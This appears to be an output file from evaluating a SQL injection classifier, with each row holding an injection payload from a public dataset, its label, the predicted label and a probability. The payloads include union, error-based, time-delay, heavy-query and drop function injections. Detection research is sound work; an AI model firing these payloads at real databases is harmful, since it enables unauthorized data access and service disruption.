text,source,true_label,pred_label,prob_sqli,correct
"1"" )  and 9198 = 9198--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962329864502,1
"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999649524688721,1
"1' )  where 8948 = 8948 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999620914459229,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""rbqs"" = ""rbqs",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999631643295288,1
"1'  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  'hpbt' = 'hpbt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999618530273438,1
select case when 8237 = 9948 then 1 else null end--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999568462371826,1
"1' )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'qdsr' like 'qdsr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999642372131348,1
"1"" where 8234 = 8234",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999583959579468,1
"1  )  )   as qfnu where 1609 = 1609 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999638795852661,1
"1"" )  or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
1 )  where 9307 = 9307,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999589920043945,1
"1'  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'rdpv' = 'rdpv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
1'  )  )   )  and 4069 = 8786 and   (  (   ( 'eftr' = 'eftr,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
1' )  where 7903 = 7903,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962568283081,1
-4484'  )  )   or 6872 = 6872 and   (  (  'oxuo' = 'oxuo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
"1%"" and 1343 = 5939#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962568283081,1
"1 )  as nfgb where 2503 = 2503 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999650716781616,1
-6100' )  as kvfc where 2377 = 2377 or 6872 = 6872--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999650716781616,1
"1  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  4686 = 4686",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999638795852661,1
select  ( case when  ( 9490 = 6134 )  then 9490 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962568283081,1
-4768'|| ( select 'dded' from dual where 6499 = 6499 union all select 6499--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999626874923706,1
select  ( case when  ( 6047 = 8897 )  then 6047 else 6047* ( select 6047 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999556541442871,1
"1"" )  and 3732 = 3850 and  ( ""edjv"" = ""edjv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999649524688721,1
"1""  )  )   and 7656 = 5604 and   (  (  ""zuhv"" = ""zuhv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999653100967407,1
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
"1%""  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
-2817 )  where 1212 = 1212 or 3266 = 1102,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
"1'  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( 'ichh' like 'ichh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999643564224243,1
"-1196""  )  )   or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""srlq"" = ""srlq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999641180038452,1
"-4692%""  )  )   union all select 1781,1781#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
1' and 2908 = 8067--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999630451202393,1
"1"" where 7879 = 7879",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999593496322632,1
"1""  )  )   as ikuz where 7385 = 7385",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
"-1985%'  )  )   )  union all select 3051,3051,3051--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999629259109497,1
"1%""  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999638795852661,1
1 )  as nioj where 9703 = 9703,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"1 )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999622106552124,1
"1' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( 'qutm' = 'qutm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999632835388184,1
1'  )  )   waitfor delay '0:0:5' and   (  (  'jcfe' = 'jcfe,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999963641166687,1
"-8966""  )  )   )  or 1628 = 2712",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999649524688721,1
"1' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'xdce' = 'xdce",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999661445617676,1
"1"" )  where 2312 = 2312 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999635219573975,1
"-2951"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999645948410034,1
"-7889""  )  )   as oayf where 1765 = 1765 or 8571 = 8571--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
if ( 6767 = 5022 )  select 6767 else drop function buii--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999642372131348,1
"-2601' )  union all select 2866,2866,2866,2866,2866,2866--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999644756317139,1
"1' )  or elt ( 6272 = 6272,sleep ( 5  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999642372131348,1
"-1876'|| ( select 'itfc' from dual where 9584 = 9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"-8709"" or 8571 = 8571--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999613761901855,1
"1%""  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999663829803467,1
"1'  )  )   )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'gmvk' like 'gmvk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999644756317139,1
"1 )  union all select null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999599456787109,1
"1', ( select  ( case when  ( 5586 = 6403 )  then 1 else 5586* ( select 5586 from mysql.db )  end  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962329864502,1
1 )  where 1487 = 1487,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999611377716064,1
"select * from generate_series ( 6730,6730,case when  ( 6730 = 9431 )  then 1 else 0 end )  limit 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999604225158691,1
"-4413%'  )  )   union all select 1345,1345#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
"1', ( case when 3598 = 2118 then 1 else null end )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999620914459229,1
-2920'  )  )   or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'rzey' = 'rzey,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999653100967407,1
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and ""cecf"" = ""cecf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999622106552124,1
"1'+ ( select qymy where 8657 = 8657 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
"1"" )  as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999651908874512,1
"1"" )  as uorp where 7208 = 7208",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"-8106%"" )  union all select 2051,2051,2051,2051,2051,2051#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"-5526 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999643564224243,1
"-3377"" )  or 4982 = 6608#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999643564224243,1
1' rlike  ( select  ( case when  ( 1916 = 7874 )  then 1 else 0x28 end  )  )   and 'ughq' = 'ughq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
1' )  where 2511 = 2511 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999642372131348,1
-9847%'  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999650716781616,1
"1""  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( ""tpxo"" like ""tpxo",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999644756317139,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999606609344482,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'jxqf' like 'jxqf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999643564224243,1
"-1332 )  as qtbb where 7261 = 7261 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
-6145 or  ( 8459 = 8459 ) *4906-- yklv,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999635219573975,1
"1"" where 2235 = 2235 union all select null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999617338180542,1
"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  # qmkh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
1%'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999642372131348,1
-2604  )  )   as sekb where 6897 = 6897 or 1000 = 7683,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
1'  )  )   )  rlike  ( select  ( case when  ( 4076 = 4881 )  then 1 else 0x28 end  )  )   and   (  (   ( 'grzs' = 'grzs,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999629259109497,1
1'+ ( select 'rejz' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )    )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999653100967407,1
1'  )  )   as jbcd where 9078 = 9078 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
-6353%'  )  )   or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999603033065796,1
"-8982'+ ( select anyd where 5358 = 5358 union all select 5358,5358,5358,5358,5358,5358#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999631643295288,1
"1""  )  )   union all select null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999622106552124,1
"1' or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999619722366333,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (  'btnl' = 'btnl",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999614953994751,1
"-9098'|| ( select 'xodn' from dual where 8202 = 8202 union all select 8202,8202,8202,8202,8202,8202,8202--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999629259109497,1
"1%' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999659061431885,1
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'bfrq' like 'bfrq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999635219573975,1
( select * from  ( select ( sleep ( 5  )  )   ) srmq ) -- mmjk,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999635219573975,1
"1"" )  as nyui where 2511 = 2511",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999635219573975,1
"select sleep ( 5 )  and   (  (   ( ""uvzc"" like ""uvzc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999629259109497,1
-8010' or  ( 2225 = 8491 ) *8491 and 'eipf' = 'eipf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 'amjh' = 'amjh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999629259109497,1
"1"" )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""hbfr"" like ""hbfr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
1 )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( 6518 = 6518,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999654293060303,1
"1""  )  )   as dvpb where 6673 = 6673",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962568283081,1
select case when 1802 = 7063 then 1 else null end--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999575614929199,1
"1"" and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""krtr"" like ""krtr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'nhuk' = 'nhuk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
"-6924' )  union all select 2046,2046,2046,2046,2046,2046,2046--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"1'  )  )   and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (  'wcmt' = 'wcmt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999645948410034,1
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'cxor' = 'cxor",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999661445617676,1
-5113'  )  )   )  or 7200 = 3094--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999638795852661,1
"1%""  )  )   )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
"1"" or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999635219573975,1
"1"" )  where 2367 = 2367",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999608993530273,1
-7707'  )  )   union all select 3172#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999631643295288,1
"1 )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 8600 = 8600",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999638795852661,1
"1, ( case when 5514 = 9602 then 1 else null end )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999585151672363,1
"1"" )  where 4905 = 4905 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999619722366333,1
"end and   (  (  ""cxoi"" = ""cxoi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
"-7627%""  )  )   union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999620914459229,1
"1  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  5888 = 5888",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
-5708 where 3134 = 3134 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999626874923706,1
"1 )  and make_set ( 8403 = 8403,8899 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999603033065796,1
1 )  as ptxw where 9873 = 9873,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999963641166687,1
1'|| ( select 'jslz' where 8405 = 8405 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo  )  )  ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999644756317139,1
1  )  )   )  and 4595 = 4595#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999617338180542,1
"1"" )  where 9093 = 9093",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999961256980896,1
"1""  )  )   )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999626874923706,1
"-5211""  )  )   as bkvr where 4082 = 4082 or 2323 = 8052",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
"1'  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  'dgwe' like 'dgwe",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
"1' in boolean mode )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999638795852661,1
